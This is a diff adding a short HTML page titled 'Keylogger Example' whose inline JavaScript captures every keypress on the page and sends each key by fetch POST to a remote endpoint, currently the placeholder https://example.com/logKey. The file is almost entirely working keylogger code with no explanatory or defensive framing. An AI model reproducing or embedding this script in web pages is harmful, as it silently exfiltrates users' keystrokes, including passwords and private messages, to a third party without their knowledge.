@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger Example</title>
+</head>
+<body>
+
+<!-- JavaScript code -->
+<script>
+    document.onkeypress = function(e) {
+        // Retrieve the pressed key
+        var key = String.fromCharCode(e.keyCode || e.which)
+
+        // Log the key to the console
+        console.log(key)
+
+        // Send the key to a server using AJAX
+        sendKeyToServer(key)
+    }
+
+    function sendKeyToServer(key) {
+        // Define the server endpoint
+        var serverEndpoint = 'https://example.com/logKey'
+
+        // Create a payload with the pressed key
+        var payload = {
+            key: key
+        }
+
+        // Send the key to the server using Fetch API
+        fetch(serverEndpoint, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => {
+            // Log the server response
+            console.log('Server Response:', data)
+        })
+        .catch(error => {
+            console.error('Error:', error)
+        })
+    }
+</script>
+
+</body>
+</html>
